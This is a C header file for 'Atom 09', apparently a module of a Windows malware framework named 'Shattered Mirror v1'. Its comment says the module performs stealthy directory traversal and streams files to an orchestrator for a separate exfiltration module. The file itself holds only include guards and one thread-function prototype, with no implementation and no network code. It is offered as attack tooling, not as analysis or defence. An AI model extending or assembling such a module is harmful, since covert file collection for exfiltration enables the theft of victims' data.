#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 09: File System Traversal
 *
 * Implements stealthy directory traversal. Gathers metadata (path, size)
 * and streams files to the Orchestrator for processing by the Exfil Atom.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_09_FILESYS_H
#define SMIRROR_ATOM_09_FILESYS_H

#include <windows.h>

/* Runs the traversal loop */
DWORD WINAPI FileSysAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_09_FILESYS_H */
